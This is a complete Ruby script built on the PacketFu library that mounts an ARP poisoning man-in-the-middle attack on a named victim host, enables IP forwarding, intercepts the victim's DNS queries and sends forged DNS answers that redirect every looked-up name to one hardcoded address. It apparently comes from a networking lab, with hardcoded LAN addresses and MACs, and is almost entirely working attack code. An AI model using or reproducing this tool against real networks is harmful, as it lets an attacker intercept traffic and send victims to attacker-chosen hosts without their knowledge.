#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'


def initArpPackets(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)
	puts "mac addresses"
	@victimMAC = "78:2b:cb:a3:3f:85"#"78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)

		puts "Constructing arp packets"

	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @srcMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @victimMAC#[:eth_saddr]       		# target's MAC address
	arp_packet_target.arp_saddr_mac = @srcMAC#[:eth_saddr]   #'78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_target.arp_daddr_mac = @victimMAC#[:eth_saddr]  #'78:2b:cb:a3:ef:c9'   # target's MAC address
	arp_packet_target.arp_saddr_ip = @routerIP #'192.168.0.100'        # router's IP
	arp_packet_target.arp_daddr_ip = @victimIP # '192.168.0.13'         # target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @srcMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_router.eth_daddr = @routerMAC#[:eth_saddr] #'00:1a:6d:38:15:ff'       # router's MAC address
	arp_packet_router.arp_saddr_mac = @srcMAC#[:eth_saddr]   # sender's MAC address
	arp_packet_router.arp_daddr_mac = @routerMAC#[:eth_saddr]   #'00:1a:6d:38:15:ff'   # router's MAC address
	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @routerIP        	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
	
	puts "begin sending arp packets"
	caught=false
	while caught==false do
	sleep 1
	arp_packet_target.to_w(@interface)
	arp_packet_router.to_w(@interface)
	end
end

def revertArpPackets(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = "78:2b:cb:a3:43:25" #	PacketFu::Utils.whoami?(:iface => @interface)

	@victimMAC = "78:2b:cb:a3:3f:85"#"78:2b:cb:a3:eb:af" #PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = "00:1a:6d:38:15:ff" #PacketFu::Utils.arp(@routerIP, :iface => @interface)

	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @routerMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @victimMAC#[:eth_saddr]       		# target's MAC address
	arp_packet_target.arp_saddr_mac = @routerMAC#[:eth_saddr]   #'78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_target.arp_daddr_mac = @victimMAC#[:eth_saddr]  #'78:2b:cb:a3:ef:c9'   # target's MAC address
	arp_packet_target.arp_saddr_ip = @routerIP #'192.168.0.100'        # router's IP
	arp_packet_target.arp_daddr_ip = @victimIP # '192.168.0.13'         # target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @victimMAC#[:eth_saddr]       # sender's MAC address
	arp_packet_router.eth_daddr = @routerMAC#[:eth_saddr] #'00:1a:6d:38:15:ff'       # router's MAC address
	arp_packet_router.arp_saddr_mac = @victimMAC#[:eth_saddr]   # sender's MAC address
	arp_packet_router.arp_daddr_mac = @routerMAC#[:eth_saddr]   #'00:1a:6d:38:15:ff'   # router's MAC address
	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @routerIP        	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
	
	
	arp_packet_target.to_w(@interface)
	arp_packet_router.to_w(@interface)
	
end

def sendResponse(packet, domainName)
	# Convert the IP address
	facebookIP = "69.171.234.21"
	myIP = facebookIP.split(".");
	myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')

	# Create the UDP packet
	response = PacketFu::UDPPacket.new()#:config => @srcInfo)
	response.udp_src = packet.udp_dst
	response.udp_dst = packet.udp_src
	response.ip_saddr = packet.ip_daddr
	response.ip_daddr = @victimIP
	response.eth_daddr = @victimMAC
	response.eth_saddr = @srcMAC

	# Transaction ID
	response.payload = packet.payload[0,2]

	response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

	# Domain name
	domainName.split(".").each do |section|
	response.payload += section.length.chr
	response.payload += section
	end

	# Set more default values...........
	response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
	response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"

	# IP
	response.payload += myIP2

	# Calculate the packet
	response.recalc

	# Send the packet out
	response.to_w(@interface)	

end
def getDomainName(rawDomain)
        domainName = ""
        
        while true
            
            # Get the length of the next section of the domain name
        	length = rawDomain[0].unpack('C')

		length =  "%i" %length
		length = length.to_i

		if length == 0
			# We have all the sections, so send it back
			return domainName = domainName[0, domainName.length - 1]
		elsif length != 0

			# Copy the section of the domain name over
			domainName += rawDomain[1, length] + "."
			rawDomain = rawDomain[length + 1..-1]
		else
			# Malformed packet!
			return nil
		end
	end
end

def initDns(intface, victimIP)
	iface = intface
	filter = "udp and port 53  and  src " + victimIP #and udp[10]&0x80 = 0
	capture_session = PacketFu::Capture.new(
		:iface => iface, 
		:start => true, 
#		:promisc => true,
		:filter => filter ) 
	puts "dns stream" 
	capture_session.stream.each do |packet|
		if PacketFu::UDPPacket.can_parse?(packet)
			puts "dns packet found!" 
			pkt = PacketFu::Packet.parse packet
			


			domainName = getDomainName(pkt.payload[12..-1])

			if domainName == nil
				next
			end
			puts "DNS request for: " + domainName
			sendResponse(pkt, domainName)
		end
	end

end


begin
	unless (ARGV.size == 2)
		puts "Usage: ruby #{$0} [Interface] [Victim IP]"
		puts "Example: ruby #{$0} em1 192.168.0.2"
		exit
	end
	# Enable IP forwarding
	`echo 1 > /proc/sys/net/ipv4/ip_forward`


	puts "Starting the ARP poisoning thread..."
	spoof_thread = Thread.new{initArpPackets("em1","192.168.0.3")} 
	#dns_thread = Thread.new{initDns("em1","192.168.0.1")} 
initDns("em1","192.168.0.3")	
spoof_thread.join
	#dns_thread.join
	


	 # Catch the interrupt and kill the threads
	rescue Interrupt
	puts "\nDNS spoof stopped by interrupt signal."
	Thread.kill(spoof_thread)
		
	revertArpPackets("em1","192.168.0.3")
	#Thread.kill(dns_thread)
	`echo 0 > /proc/sys/net/ipv4/ip_forward`
	exit 0

end



